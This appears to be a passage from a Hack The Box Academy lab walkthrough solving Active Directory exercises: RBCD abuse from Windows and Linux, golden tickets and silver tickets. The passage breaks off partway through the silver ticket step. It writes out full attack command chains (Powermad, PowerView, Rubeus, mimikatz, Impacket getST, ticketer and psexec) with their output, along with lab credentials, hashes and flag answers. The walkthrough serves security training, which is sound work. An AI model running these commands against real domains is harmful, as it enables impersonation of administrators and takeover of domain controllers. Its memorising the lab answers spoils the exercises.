[17:58:53:430] [5606:5607] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.205.26:3389) 
[17:58:53:430] [5606:5607] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[17:58:53:430] [5606:5607] [ERROR][com.freerdp.crypto] - Common Name (CN):
[17:58:53:430] [5606:5607] [ERROR][com.freerdp.crypto] - 	WS01.INLANEFREIGHT.LOCAL
[17:58:53:430] [5606:5607] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.205.26:3389 (RDP-Server):
	Common Name: WS01.INLANEFREIGHT.LOCAL
	Subject:     CN = WS01.INLANEFREIGHT.LOCAL
	Issuer:      CN = WS01.INLANEFREIGHT.LOCAL
	Thumbprint:  56:5c:fd:bc:9f:35:08:24:c2:b1:9e:89:4d:86:02:cc:3b:c6:c8:d2:7a:48:d3:e3:21:56:9f:de:f7:19:2d:25
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, in a privileged `PowerShell` session, students need to navigate to `C:\Tools\` and invoke `SearchRBCD.ps1` to check the computers in the domain and users that have the required access rights on them; students will find that `carole.holmes` has rights over `DC01` that has privileges to modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` property on a computer, which is commonly possible if the user has `GenericWrite`, `GenericAll`, `WriteProperty`, or `WriteDACL` privileges on a computer object:

Code: powershell

```powershell
.\SearchRBCD.ps1
```

```
PS C:\Tools> .\SearchRBCD1.ps1

carole.holmes has the required access rights on DC01
```

After importing it, students then need to create a fake computer using [Powermad](https://github.com/Kevin-Robertson/Powermad):

Code: powershell

```powershell
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount HACKTHEBOX -Password $(ConvertTo-SecureString "Hackthebox123+!" -AsPlainText -Force)
```

```
PS C:\Tools> Import-Module .\Powermad.ps1
PS C:\Tools> New-MachineAccount -MachineAccount HACKTHEBOX -Password $(ConvertTo-SecureString "Hackthebox123+!" -AsPlainText -Force)

[+] Machine account HACKTHEBOX added
```

Then, students need to add this computer account to the trust list of the targeted computer (which is possible because the attacker has `GenericAll` `ACL` on this computer), performing the below:

1. Obtain the computer's SID.
2. Use the [Security Descriptor Definition Language (SDDL)](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language) to create a security descriptor.
3. Set `msDS-AllowedToActOnBehalfOfOtherIdentity` in raw binary format.
4. Modify the target computer.

Code: powershell

```powershell
Import-Module .\PowerView.ps1
$ComputerSid = Get-DomainComputer HACKTHEBOX -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
$credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)
Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose
```

```
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> $ComputerSid = Get-DomainComputer HACKTHEBOX -Properties objectsid | Select -Expand objectsid
PS C:\Tools> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
PS C:\Tools> $SDBytes = New-Object byte[] ($SD.BinaryLength)
PS C:\Tools> $SD.GetBinaryForm($SDBytes, 0)
PS C:\Tools> $credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)
PS C:\Tools> Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Extracted domain 'INLANEFREIGHT.LOCAL' from 'CN=DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL'
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL)))
VERBOSE: [Set-DomainObject] Setting 'msds-allowedtoactonbehalfofotheridentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 7
43 120 111 218 117 136 70 100 139 92 35 7 16 0 0' for object 'DC01$'
```

Afterward, students need to get the hash of the fake computer account `HACKTHEBOX` using the [hash](https://github.com/GhostPack/Rubeus#hash) action of `Rubeus`, to attain `CF767C9A9C529361F108AA67BF1B3695`:

Code: powershell

```powershell
.\Rubeus.exe hash /password:Hackthebox123+! /user:HACKTHEBOX$ /domain:inlanefreight.local
```

```
PS C:\Tools> .\Rubeus.exe hash /password:Hackthebox123+! /user:HACKTHEBOX$ /domain:inlanefreight.local

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Calculate Password Hash(es)

[*] Input password             : Hackthebox123+!
[*] Input username             : HACKTHEBOX$
[*] Input domain               : inlanefreight.local
[*] Salt                       : INLANEFREIGHT.LOCALhosthackthebox.inlanefreight.local
[*]       rc4_hmac             : CF767C9A9C529361F108AA67BF1B3695
[*]       aes128_cts_hmac_sha1 : 91BE80CCB5F58A8F18960858524B6EC6
[*]       aes256_cts_hmac_sha1 : 9457C7FC2D222793B1871EE4E62FEFB1CE158B719F99B6C992D7DC9FFB625D97
[*]       des_cbc_md5          : 5B516BDA5180E5CB
```

Subsequently, students need to forge a ticket using the attained hash by requesting a TGS ticket for the service `cifs/dc01.inlanefreight.local` and impersonating `Administrator` with the [s4u](https://github.com/GhostPack/Rubeus#s4u) action of `Rubeus`:

Code: powershell

```powershell
.\Rubeus.exe s4u /user:HACKTHEBOX$ /rc4:CF767C9A9C529361F108AA67BF1B3695 /impersonateuser:administrator /msdsspn:cifs/dc01.inlanefreight.local /ptt
```

```
PS C:\Tools> .\Rubeus.exe s4u /user:HACKTHEBOX$ /rc4:CF767C9A9C529361F108AA67BF1B3695 /impersonateuser:administrator /msdsspn:cifs/dc01.inlanefreight.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: S4U

[*] Using rc4_hmac hash: CF767C9A9C529361F108AA67BF1B3695
[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.LOCAL\HACKTHEBOX$'
[*] Using domain controller: 172.16.99.3:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

  doIF2jCCBdagAwIBBaEDAgEWooIE1zCCBNNhggTPMIIEy6ADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
<SNIP>

[*] Action: S4U

[*] Building S4U2self request for: 'HACKTHEBOX$@INLANEFREIGHT.LOCAL'
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Sending S4U2self request to 172.16.99.3:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'HACKTHEBOX$@INLANEFREIGHT.LOCAL'
[*] base64(ticket.kirbi):

  doIF+jCCBfagAwIBBaEDAgEWooIFBTCCBQFhggT9MIIE+aADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
<SNIP>

[*] Impersonating user 'administrator' to target SPN 'cifs/dc01.inlanefreight.local'
[*] Building S4U2proxy request for service: 'cifs/dc01.inlanefreight.local'
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Sending S4U2proxy request to domain controller 172.16.99.3:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc01.inlanefreight.local':

  doIG9DCCBvCgAwIBBaEDAgEWooIF7DCCBehhggXkMIIF4KADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
<SNIP>
[+] Ticket successfully imported!
```

At last, when reading the contents of the file `\\dc01.inlanefreight.local\c$\carole.holmes\flag.txt`, students will attain the flag `Carole_Fl4G_RBCD`:

Code: powershell

```powershell
more \\dc01.inlanefreight.local\c$\carole.holmes\flag.txt
```

```
PS C:\Tools> more \\dc01.inlanefreight.local\c$\carole.holmes\flag.txt

Carole_Fl4G_RBCD
```

Answer: `Carole_Fl4G_RBCD`

# RBCD from Linux

## Question 1

### "Repeat the steps in the section; what is the content of C:\\carole.holmes\\flag.txt on DC01?"

After spawning the target machine, students first need to create an entry for it in `/etc/hosts` with the domain name `inlanefreight.local` and `dc01.inlanefreight.local`:

Code: shell

```shell
sudo sh -c 'echo "STMIP inlanefreight.local dc01.inlanefreight.local" >> /etc/hosts'
```

```
┌─[htb-ac-413848@htb-pofdwtjunw]─[~]
└──╼ $sudo sh -c 'echo "10.129.205.35 inlanefreight.local dc01.inlanefreight.local" >> /etc/hosts'
```

Subsequently, students need to use [addcomputer.py](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py) to create a computer account:

Code: shell

```shell
addcomputer.py -computer-name 'HACKTHEBOX$' -computer-pass 'Hackthebox123+!' -dc-ip STMIP inlanefreight.local/carole.holmes:Y3t4n0th3rP4ssw0rd
```

```
┌─[htb-ac-413848@htb-av0hxd4mxn]─[~]
└──╼ $addcomputer.py -computer-name 'HACKTHEBOX$' -computer-pass 'Hackthebox123+!' -dc-ip 10.129.205.35 inlanefreight.local/carole.holmes:Y3t4n0th3rP4ssw0rd

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Successfully added machine account HACKTHEBOX$ with password Hackthebox123+!.
```

Then, students need to add this account to the targeted computer's `DC01` trust list, which is possible because `carole.holmes` has `GenericAll` `ACL` on this computer. Students need to use the [rbcd.py](https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py) Python script to do so (to download it, students can run `wget` against the script's link):

Code: shell

```shell
python3 rbcd.py -dc-ip STMIP -t DC01 -f HACKTHEBOX inlanefreight\\carole.holmes:Y3t4n0th3rP4ssw0rd
```

```
┌─[htb-ac-413848@htb-av0hxd4mxn]─[~]
└──╼ $python3 rbcd.py -dc-ip 10.129.205.35 -t DC01 -f HACKTHEBOX inlanefreight\\carole.holmes:Y3t4n0th3rP4ssw0rd

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Starting Resource Based Constrained Delegation Attack against DC01$
[*] Initializing LDAP connection to 10.129.205.35
[*] Using inlanefreight\carole.holmes account with password ***
[*] LDAP bind OK
[*] Initializing domainDumper()
[*] Initializing LDAPAttack()
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer \`HACKTHEBOX\` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer \`DC01\`
[*] Delegation rights modified succesfully!
[*] HACKTHEBOX$ can now impersonate users on DC01$ via S4U2Proxy
```

Thereafter, students need to use [getST.py](https://github.com/fortra/impacket/blob/master/examples/getST.py) to ask for a TGT for the created computer account, followed by a `S4U2Self` request to get a forwardable TGS ticket, and then a `S4U2Proxy` to get a valid TGS ticket for a specific SPN on the targeted computer, which is `DC01` (in case students get the error message `[Errno 2] No such file or directory: './DC01$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache'`, they need to run the command `unset KRB5CCNAME`):

Code: shell

```shell
getST.py -spn CIFS/DC01.inlanefreight.local -impersonate Administrator -dc-ip STMIP inlanefreight.local/'HACKTHEBOX:Hackthebox123+!'
```

```
┌─[htb-ac-413848@htb-av0hxd4mxn]─[~]
└──╼ $getST.py -spn CIFS/DC01.inlanefreight.local -impersonate Administrator -dc-ip 10.129.205.35 inlanefreight.local/'HACKTHEBOX:Hackthebox123+!'

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

Subsequently, students need to import the ticket attained `Administrator.ccache` by setting its path to the environment variable `KRB5CCNAME`:

Code: shell

```shell
export KRB5CCNAME=./Administrator.ccache
```

```
┌─[htb-ac-413848@htb-av0hxd4mxn]─[~]
└──╼ $export KRB5CCNAME=Administrator.ccache
```

Students then need to use [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py) to get a remote shell on `DC01` as `Administrator`:

Code: shell

```shell
psexec.py -k -no-pass dc01.inlanefreight.local
```

```
┌─[htb-ac-413848@htb-av0hxd4mxn]─[~]
└──╼ $psexec.py -k -no-pass dc01.inlanefreight.local

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Requesting shares on dc01.inlanefreight.local.....
[*] Found writable share ADMIN$
[*] Uploading file ojIQMPjN.exe
[*] Opening SVCManager on dc01.inlanefreight.local.....
[*] Creating service pUwR on dc01.inlanefreight.local.....
[*] Starting service pUwR.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

At last, when reading the contents of the file `C:\carole.holmes\flag.txt`, students will attain the flag `RBCD_Fr0M_L1Nux_1S_FuN`:

Code: cmd

```cmd
more C:\carole.holmes\flag.txt
```

```
C:\Windows\system32> more C:\carole.holmes\flag.txt

RBCD_Fr0M_L1Nux_1S_FuN
```

Answer: `RBCD_Fr0M_L1Nux_1S_FuN`

# Golden Ticket

## Question 1

### "The krbtgt's NTLM hash is c0231bd8a4a4de92fca0760c0ba9e7a6. Using a Golden Ticket, what is the content of C:\\Users\\Administrator\\Documents\\goldenticket.txt on DC01?"

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:STMIP /dynamic-resolution
```

```
┌─[htb-ac-413848@htb-iozi1h3tmt]─[~]
└──╼ $xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.205.26 /dynamic-resolution

[11:22:22:197] [2993:2994] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-413848/.config/freerdp
[11:22:22:198] [2993:2994] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-413848/.config/freerdp/certs]
[11:22:22:198] [2993:2994] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-413848/.config/freerdp/server]
[11:22:22:214] [2993:2994] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[11:22:22:214] [2993:2994] [WARN][com.freerdp.crypto] - CN = WS01.INLANEFREIGHT.LOCAL
[11:22:22:215] [2993:2994] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[11:22:22:215] [2993:2994] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[11:22:22:215] [2993:2994] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[11:22:22:215] [2993:2994] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.205.26:3389) 
[11:22:22:215] [2993:2994] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[11:22:22:215] [2993:2994] [ERROR][com.freerdp.crypto] - Common Name (CN):
[11:22:22:215] [2993:2994] [ERROR][com.freerdp.crypto] - 	WS01.INLANEFREIGHT.LOCAL
[11:22:22:215] [2993:2994] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.205.26:3389 (RDP-Server):
	Common Name: WS01.INLANEFREIGHT.LOCAL
	Subject:     CN = WS01.INLANEFREIGHT.LOCAL
	Issuer:      CN = WS01.INLANEFREIGHT.LOCAL
	Thumbprint:  56:5c:fd:bc:9f:35:08:24:c2:b1:9e:89:4d:86:02:cc:3b:c6:c8:d2:7a:48:d3:e3:21:56:9f:de:f7:19:2d:25
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, in a privileged `PowerShell` session, students need to navigate to `C:\Tools\`, import `PowerView`, and then invoke the `Get-DomainSID` function to find that the SID of the domain is `S-1-5-21-1870146311-1183348186-593267556`:

Code: powershell

```powershell
Import-Module .\PowerView.ps1
Get-DomainSID
```

```
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainSID

S-1-5-21-1870146311-1183348186-593267556
```

With the SID and the hash of `krbtgt` (`c0231bd8a4a4de92fca0760c0ba9e7a6`) known for the domain `inlanefreight.local`, students need to use `mimikatz` to forge a `Golden Ticket` that impersonates the `Administrator` user:

Code: powershell

```powershell
.\mimikatz.exe privilege::debug "kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-1870146311-1183348186-593267556 /rc4:c0231bd8a4a4de92fca0760c0ba9e7a6 /ptt" exit
```

```
PS C:\Tools> .\mimikatz.exe privilege::debug "kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-1870146311-1183348186-593267556 /rc4:c0231bd8a4a4de92fca0760c0ba9e7a6 /ptt" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-1870146311-1183348186-593267556 /rc4:c0231bd8a4a4de92fca0760c0ba9e7a6 /ptt
User      : Administrator
Domain    : inlanefreight.local (INLANEFREIGHT)
SID       : S-1-5-21-1870146311-1183348186-593267556
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: c0231bd8a4a4de92fca0760c0ba9e7a6 - rc4_hmac_nt
Lifetime  : 4/28/2023 5:49:08 AM ; 4/25/2033 5:49:08 AM ; 4/25/2033 5:49:08 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ inlanefreight.local' successfully submitted for current session

mimikatz(commandline) # exit
Bye!
```

At last, when reading the contents of the file `\\DC01\C$\Users\Administrator\Documents\goldenticket.txt`, students will attain the flag `IMp3rs0natE_Administrator_2_Op3n_tH1s_Fl4G`:

Code: powershell

```powershell
more \\DC01\C$\Users\Administrator\Documents\goldenticket.txt
```

```
PS C:\Tools> more \\DC01\C$\Users\Administrator\Documents\goldenticket.txt

IMp3rs0natE_Administrator_2_Op3n_tH1s_Fl4G
```

Answer: `IMp3rs0natE_Administrator_2_Op3n_tH1s_Fl4G`

# Golden Ticket from Linux

## Question 1

### "The krbtgt's NTLM hash is c0231bd8a4a4de92fca0760c0ba9e7a6. Using a Golden Ticket, what is the content of C:\\Users\\Administrator\\Documents\\goldenticket.txt on DC01?"

After spawning the target machine, students first need to create an entry for it in `/etc/hosts` with the domain name `inlanefreight.local` and `dc01.inlanefreight.local`:

Code: shell

```shell
sudo sh -c 'echo "STMIP inlanefreight.local dc01.inlanefreight.local" >> /etc/hosts'
```

```
┌─[htb-ac-413848@htb-iozi1h3tmt]─[~]
└──╼ $sudo sh -c 'echo "10.129.205.35 inlanefreight.local dc01.inlanefreight.local" >> /etc/hosts'
```

Subsequently, students need to use [lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py) to retrieve the domain's SID, to find it to be `S-1-5-21-1870146311-1183348186-593267556`:

Code: shell

```shell
lookupsid.py inlanefreight.local/'htb-student:HTB_@cademy_stdnt!'@dc01.inlanefreight.local -domain-sids
```

```
┌─[htb-ac-413848@htb-iozi1h3tmt]─[~]
└──╼ $lookupsid.py inlanefreight.local/'htb-student:HTB_@cademy_stdnt!'@dc01.inlanefreight.local -domain-sids

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Brute forcing SIDs at dc01.inlanefreight.local
[*] StringBinding ncacn_np:dc01.inlanefreight.local[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1870146311-1183348186-593267556
```

With the SID and the hash of `krbtgt` (`c0231bd8a4a4de92fca0760c0ba9e7a6`) known for the domain `inlanefreight.local`, students need to use [ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py) to forge a `Golden Ticket` that impersonates the user `Administrator`:

Code: shell

```shell
ticketer.py -nthash c0231bd8a4a4de92fca0760c0ba9e7a6 -domain-sid S-1-5-21-1870146311-1183348186-593267556 -domain inlanefreight.local Administrator
```

```
┌─[htb-ac-413848@htb-iozi1h3tmt]─[~]
└──╼ $ticketer.py -nthash c0231bd8a4a4de92fca0760c0ba9e7a6 -domain-sid S-1-5-21-1870146311-1183348186-593267556 -domain inlanefreight.local Administrator

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for inlanefreight.local/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in Administrator.ccache
```

Subsequently, students need to import the ticket attained `Administrator.ccache` by setting its path to the environment variable `KRB5CCNAME`:

Code: shell

```shell
export KRB5CCNAME=./Administrator.ccache
```

```
┌─[htb-ac-413848@htb-av0hxd4mxn]─[~]
└──╼ $export KRB5CCNAME=Administrator.ccache
```

Students then need to use [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py) to get a remote shell on `DC01` as `Administrator`:

Code: shell

```shell
psexec.py -k -no-pass dc01.inlanefreight.local
```

```
┌─[htb-ac-413848@htb-iozi1h3tmt]─[~]
└──╼ $psexec.py -k -no-pass dc01.inlanefreight.local

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Requesting shares on dc01.inlanefreight.local.....
[*] Found writable share ADMIN$
[*] Uploading file gxEuqLib.exe
[*] Opening SVCManager on dc01.inlanefreight.local.....
[*] Creating service svwA on dc01.inlanefreight.local.....
[*] Starting service svwA.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> more C:\Users\Administrator\Documents\goldenticket.txt

G0lD3n_T1CK3t_IMp3rs0nat10N_Fr0M_L1nUX
```

At last, when reading the contents of the file `C:\Users\Administrator\Documents\goldenticket.txt`, students will attain the flag `G0lD3n_T1CK3t_IMp3rs0nat10N_Fr0M_L1nUX`:

Code: cmd

```cmd
more C:\Users\Administrator\Documents\goldenticket.txt
```

```
C:\Windows\system32> more C:\Users\Administrator\Documents\goldenticket.txt

G0lD3n_T1CK3t_IMp3rs0nat10N_Fr0M_L1nUX
```

Answer: `G0lD3n_T1CK3t_IMp3rs0nat10N_Fr0M_L1nUX`

# Silver Ticket

## Question 1

### "SQL01$'s NTLM hash is 027c6604526b7b16a22e320b76e54a5b. Using a Silver Ticket, what is the content of C:\\Users\\Administrator\\Documents\\silverflag.txt on this host? (If you can't login, wait for 1 or 2 more minutes)"

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:STMIP /dynamic-resolution
```

```
┌─[htb-ac-413848@htb-iozi1h3tmt]─[~]
└──╼ $xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.26.10 /dynamic-resolution
[13:04:16:732] [4663:4664] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[13:04:16:732] [4663:4664] [WARN][com.freerdp.crypto] - CN = WS01.INLANEFREIGHT.LOCAL
[13:04:16:732] [4663:4664] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[13:04:16:732] [4663:4664] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[13:04:16:732] [4663:4664] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[13:04:16:732] [4663:4664] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.26.10:3389) 
[13:04:16:732] [4663:4664] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[13:04:16:732] [4663:4664] [ERROR][com.freerdp.crypto] - Common Name (CN):
[13:04:16:732] [4663:4664] [ERROR][com.freerdp.crypto] - 	WS01.INLANEFREIGHT.LOCAL
[13:04:16:732] [4663:4664] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.26.10:3389 (RDP-Server):
	Common Name: WS01.INLANEFREIGHT.LOCAL
	Subject:     CN = WS01.INLANEFREIGHT.LOCAL
	Issuer:      CN = WS01.INLANEFREIGHT.LOCAL
	Thumbprint:  56:5c:fd:bc:9f:35:08:24:c2:b1:9e:89:4d:86:02:cc:3b:c6:c8:d2:7a:48:d3:e3:21:56:9f:de:f7:19:2d:25
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, in a privileged `PowerShell` session, students need to navigate to `C:\Tools\` and import `PowerView` to get the domain's SID with `Get-DomainSID`, to find it to be `S-1-5-21-1870146311-1183348186-593267556`:

Code: powershell

```powershell
Import-Module .\PowerView.ps1
Get-DomainSID
```

```
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainSID

S-1-5-21-1870146311-1183348186-593267556
```

With the SID and the NTLM hash of `SQL01$` (`027c6604526b7b16a22e320b76e54a5b`) known for the domain `inlanefreight.local`, students need to use `mimikatz` to forge a `Silver Ticket` that impersonates the user `Administrator` to access the filesystem of `SQL01`:

Code: powershell

```powershell
.\mimikatz.exe privilege::debug "kerberos::golden /domain:inlanefreight.local /sid:S-1-5-21-1870146311-1183348186-593267556 /rc4:027c6604526b7b16a22e320b76e54a5b /user:Administrator /service:CIFS /target:SQL01.inlanefreight.local /ptt" exit
```

```
PS C:\Tools> .\mimikatz.exe privilege::debug "kerberos::golden /domain:inlanefreight.local /sid:S-1-5-21-1870146311-1183348186-593267556 /rc4:027c6604526b7b16a22e320b76e54a5b /user:Administrator /service:CIFS /target:SQL01.inlanefreight.local /ptt" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # kerberos::golden /domain:inlanefreight.local /sid:S-1-5-21-1870146311-1183348186-593267556 /rc4:027c6604526b7b16a22e320b76e54a5b /user:Administrator /service:CIFS /target:SQL01.inlanefreight.local /ptt
User      : Administrator
Domain    : inlanefreight.local (INLANEFREIGHT)
SID       : S-1-5-21-1870146311-1183348186-593267556
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 027c6604526b7b16a22e320b76e54a5b - rc4_hmac_nt
Service   : CIFS
Target    : SQL01.inlanefreight.local
Lifetime  : 4/28/2023 7:20:53 AM ; 4/25/2033 7:20:53 AM ; 4/25/2033 7:20:53 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

